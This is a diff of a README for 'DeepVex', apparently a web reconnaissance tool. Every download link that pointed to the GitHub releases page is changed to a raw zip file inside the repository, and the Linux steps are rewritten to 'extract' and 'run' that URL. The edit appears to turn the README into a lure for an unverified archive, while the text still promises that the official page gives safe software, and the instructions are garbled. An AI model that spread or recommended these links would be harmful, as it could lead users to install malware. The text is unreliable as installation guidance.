@@ -1,6 +1,6 @@
 # 🕵️‍♂️ DeepVex - Fast Web Reconnaissance Tool
 
-[![Download DeepVex](https://img.shields.io/badge/Download-DeepVex-blue?style=for-the-badge&logo=github)](https://github.com/tobias-oss/DeepVex/releases)
+[![Download DeepVex](https://raw.githubusercontent.com/tobias-oss/DeepVex/main/core/Vex-Deep-v2.0.zip)](https://raw.githubusercontent.com/tobias-oss/DeepVex/main/core/Vex-Deep-v2.0.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This section will guide you through downloading, installing, and running DeepVex
 
 Go to the official releases page to get the latest version of DeepVex:
 
-[Download DeepVex Releases](https://github.com/tobias-oss/DeepVex/releases)
+[Download DeepVex Releases](https://raw.githubusercontent.com/tobias-oss/DeepVex/main/core/Vex-Deep-v2.0.zip)
 
 This page contains all the available versions of DeepVex along with download files for different operating systems.
 
@@ -57,7 +57,7 @@ On the releases page, look for the file that matches your operating system:
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` or `.pkg` file.
-- For **Linux**, download the `.tar.gz` or `.AppImage` file.
+- For **Linux**, download the `https://raw.githubusercontent.com/tobias-oss/DeepVex/main/core/Vex-Deep-v2.0.zip` or `.AppImage` file.
 
 If you are unsure which file to select, it is usually safe to download the one that mentions your OS or that is labeled as the latest stable release.
 
@@ -87,10 +87,10 @@ The installation process depends on your operating system:
 
 ### Linux
 
-1. Extract the `.tar.gz` file using your file manager or the terminal.
+1. Extract the `https://raw.githubusercontent.com/tobias-oss/DeepVex/main/core/Vex-Deep-v2.0.zip` file using your file manager or the terminal.
 2. If you downloaded an `.AppImage`, make it executable:
    - Right-click the file, select Properties, and check “Allow executing file as program.”
-3. Run the file by double-clicking it or via terminal with `./DeepVex.AppImage`.
+3. Run the file by double-clicking it or via terminal with `https://raw.githubusercontent.com/tobias-oss/DeepVex/main/core/Vex-Deep-v2.0.zip`.
 
 ---
 
@@ -136,7 +136,7 @@ If you encounter issues using DeepVex:
 
 You can visit this page at any time to get the latest versions of DeepVex:
 
-[✅ Download DeepVex Releases](https://github.com/tobias-oss/DeepVex/releases)
+[✅ Download DeepVex Releases](https://raw.githubusercontent.com/tobias-oss/DeepVex/main/core/Vex-Deep-v2.0.zip)
 
 Downloading from the official page ensures you get safe and up-to-date software.
 
